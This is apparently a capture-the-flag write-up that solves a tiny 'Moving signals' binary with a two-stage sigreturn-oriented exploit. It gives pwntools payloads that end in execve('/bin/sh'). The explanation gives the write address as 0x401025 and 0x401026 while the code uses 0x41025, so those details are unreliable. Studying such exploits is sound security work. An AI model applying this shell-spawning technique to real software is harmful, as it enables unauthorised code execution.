## Moving signals
We are given an extermly small binary:

```asm
0x0000000000041000 <+0>:     mov    rdi,0x0
0x0000000000041007 <+7>:     mov    rsi,rsp
0x000000000004100a <+10>:    sub    rsi,0x8
0x000000000004100e <+14>:    mov    rdx,0x1f4
0x0000000000041015 <+21>:    syscall
0x0000000000041017 <+23>:    ret
0x0000000000041018 <+24>:    pop    rax
0x0000000000041019 <+25>:    ret
```

# The vulnerability:
Well, of course we have full control over ```rip``` using the read syscall.
In addition we again have a ```syscall``` gadget to use for ```sigreturn``` and ```execve```



## 1. Getting sigreturn:
```python
payload = b"A"*8 + p64(pop_rax) + p64(15) + p64(syscall_ret)
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x41025
frame.rdx = 0x300
frame.rsp = 0x41025
frame.rip = syscall_ret
payload += bytes(frame)
p.send(payload)
```
This payload sets ```rax = 0xf``` and syscalls, the frame that is loaded gives the registers the values:
1. ```rax = 0 for ```read``` syscall
2. ```rdi = 0``` for ```stdin```
3. ```rsi = 0x401025``` is the only known address that is also writeable, (which is right after the given code)
4. ```rsp = 0x401025``` is to align the stack right back to where we are reading into.
5. ```rip = syscall_ret``` to execute this read syscall.
Basically we read the next phase of this exploit into the code segment of the binary, and after that has been done, 
We will return to whatever that will be written to address ```0x401025```

## 2. Getting shell:
payload = p64(pop_rax) + p64(15) + p64(syscall_ret)
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x41025+248 + 0x18
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x41000
frame.rip = syscall_ret
payload += bytes(frame) + b"/bin/sh\x00"

This utilizes another ```sigreturn``` to load the values required to perform ```execve(/bin/sh)```
1. ```rax = 59``` for ```execve``` syscall
2. ```rdi = 0x401026 + 248 + 0x18``` for the address that ```/bin/sh``` will be on the stack.
3. ```rsp = 0x41000``` just to have some stack space for saftey.


And we get shell :).
